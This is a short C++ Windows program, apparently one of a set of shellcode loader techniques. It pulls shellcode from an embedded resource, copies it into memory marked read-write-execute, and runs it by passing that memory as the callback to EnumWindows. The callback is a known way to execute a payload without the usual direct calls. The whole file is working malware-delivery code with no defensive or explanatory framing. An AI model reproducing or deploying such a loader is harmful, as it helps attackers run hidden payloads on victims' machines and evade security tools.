#include"..\public.hpp"
LPVOID Memory;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	((void(*)())Memory)();
	return TRUE;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.Get shellcode memory
	Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory,shellcode, shellcodeSize);
	//2.Execute shellcode
	EnumWindows(EnumWindowsProc, NULL);
	return 0;
}